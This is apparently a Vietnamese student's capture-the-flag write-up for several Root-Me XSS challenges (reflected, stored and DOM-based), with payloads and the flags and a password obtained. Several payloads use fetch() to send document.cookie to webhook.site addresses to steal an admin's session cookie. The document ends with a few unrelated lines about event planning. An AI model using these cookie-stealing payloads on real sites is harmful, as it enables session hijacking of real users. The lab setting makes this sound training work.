# TASK 5 root-me
## XSS Reflected
mày mò trong trang web một lúc. em thấy có phần contact us có thể nhập được dữ liệu vào nhưng ở bên trên họ bảo là cái form contact này là vô dụng. 
![](https://i.imgur.com/ODGDjyy.png)
em vẫn muốn thử nó xem có phải nó lừa không. Kết quả là chẳng có gì thật. Vì khi gửi liên lạc đi thứ chúng ta nhận lại vẫn chỉ là trang đó nhưng có chữ cảm ơn.
![](https://i.imgur.com/uviy3u6.png)

![](https://i.imgur.com/NM2d17w.png)
đến đây em chuyển hướng sang nhập dữ liệu vào trên url. nhận thấy rằng sau dấu?p= sẽ là tên của trang đang hiện hành. vậy nên em sẽ thay thế phần tử đằng sau dấu bằng đó.
![](https://i.imgur.com/2vievkT.png)
đây rồi. mặc dù không thành công tuy nhiên e đã thấy dòng script của mình và 1 phần report to admin. 
mở source đọc thì em nhận ra vấn đề rằng dấu <> đã bị filter hết. Vậy nên dòng script của em không chạy được. Tuy nhiên ở phần href cũng có đường dẫn nên em sẽ thử đóng nháy đơn và chạy lại script vẫn không được do dấu <> vẫn bị mã hóa. vậy nên em thử truyền vào Attribute 
![](https://i.imgur.com/F7pu06g.png)
![](https://i.imgur.com/Toco3tY.png)
thông báo đã hiện lên. vậy là hướng đi này đã đúng. Giờ tiếp theo em muốn sửa URL thành một đường mã độc và gửi lên admin. Khi admin chỉ cần bấm vào thôi sẽ gửi lại cookie về cho em. 
Công việc trên có 2 phần. Phần thứ nhất là khi admin bấm vào thông tin sẽ gửi về đâu. Vấn đề này em sẽ sử dụng https://webhook.site/ để tạo ra một địa chỉ nhận thông tin gửi về. 
Phần thứ 2 là tạo nên URL mã độc gửi cookie của admin cho em. Em sẽ sử dụng 
fetch để bắt tập tin gửi đi từ máy admin vào kèm theo cookie của máy admin. 
trang đó sẽ thế này: 'autofocus onfocus='fetch(` link webhook? `+document.cookie)
đoạn trên cần có dấu ? sau link của webhook để url hiểu sau dấu ? sẽ là tham số. Cả đoạn code sẽ phải encode lại vì URL sẽ hiểu nhầm + thành khoảng cách đã được encode. 
![](https://i.imgur.com/J48wFV6.png)
trang web sẽ không hiện gì như lần trước nữa 
nhưng webhook đã bắt được cookie của áy chủ vừa chạy dòng URL đấy chính là máy của em. 
![](https://i.imgur.com/Ta8TOTO.png)
giờ ấn gửi cho admin và chờ admin sập bẫy khi ấn vào là xong. 
![](https://i.imgur.com/5YwaVwx.png)
đã có được cookie của admin. admin cút luôn
flag=r3fL3ct3D_XsS_fTw

## XSS-Stored1
vừa vào bài đã có chỗ để em thử chèn script vào. em thử và được thật
![](https://i.imgur.com/iHf5ImR.png)
![](https://i.imgur.com/gnmoBEo.png)
vậy em sẽ mở script và tạo link fetch về link webhook của em. Cookie gửi về chính là flag
payload: <script>fetch(`https://webhook.site/30a3b15c-886a-454e-ad1d-ba9aee49a6bd?${document.cookie}`)</script>

![](https://i.imgur.com/1NpqG5Q.png)

flag: NkI9qe4cdLIO2P7MIsWS8ofD6


## XSS-DOM Based introduction
em vào trang main sau đó nhập thử 1 số và nó báo sai. nhập lại lân nữa nó lại sai với số khác nên em nghĩ nó đã random số và so sánh với số mình nhập vào. em vứt vào burp suite thì thấy k phải.
![](https://i.imgur.com/G8rLKTT.png)
mao phắc :) kể cả mình có random ra đúng với số mình nhập vào thì cũng không được flag
tuy nhiên em nhận ra ở request có URL đã hiện lên số em nhập vào nên em đã test một lúc để thử ở phần url và bùm
![](https://i.imgur.com/3VaYJ8N.png)
![](https://i.imgur.com/WWTbP0E.png)
giờ hướng của em sẽ là viết đoạn payload có thể lấy được cookie của admin và sử dụng link đó gửi cho admin qua contact.
payload: '; alert(1); // 
giờ em thay đoạn fetch vào 
'; fetch(`https://webhook.site/ecfc82bf-b31d-4692-972d-3c2e6c43ecec?${document.cookie}`)//

thử trên url đã bắt được cookie của máy em nên em gửi lên cho admin
![](https://i.imgur.com/zRK3BGo.png)
BUM BABE
flag: 	rootme{XSS_D0M_BaSed_InTr0}

## XSS DOM based-AngularJS
em thử mọi thứ nhưng mà em thấy cách thông thường bị filter hết nên đang k biết hướng làm.
## XSS DOM Based-Eval
em thử mọi thứ nhưng mà em thấy cách thông thường bị filter hết nên đang k biết hướng làm.
## XSS-Stored2
 mày mò 1 lúc ở page em nhập thử script ở cả title và message nhưng đều không có dấu hiệu bị xss đơn giản như ở stored1 tuy nhiên có 1 điều em thấy khác lạ đó chính là status invite hiện xanh như muốn gọi mời chúng ta vào nghiên cứu ở đấy. Thử 1 vài cách nhập ở page mong thay đổi được status ở đấy nhưng mà không đượ nên em vứt vào burp suite 
![](https://i.imgur.com/bN9rVOq.png)
sau đó em thay đổi giá trị cookie status đó. ![](https://i.imgur.com/rJyhI01.png)
dòng status ở trên đã thay đổi nên em nghĩ luôn đến việc thực hiện xss ở status này. 
payload: "><script>fetch(`https://webhook.site/ecfc82bf-b31d-4692-972d-3c2e6c43ecec?${document.cookie}`)</script>

admin sa lưới là cook lun: ![](https://i.imgur.com/SrREGBv.png)
nma ở đây là 1 cái admin cookie em thử xem có phải là flag không thi nó không phải. sau đó em vứt vào burp suite xem nó có gửi gì về không. 
![](https://i.imgur.com/Dzxo6jh.png)
ra pass luôn. lét gâu.
pass : E5HKEGyCXQVsYaehaqeJs0AfV



sự chuẩn bị 
mục tiêu sự kiện 
ngân sách
giải quyết rủi ro
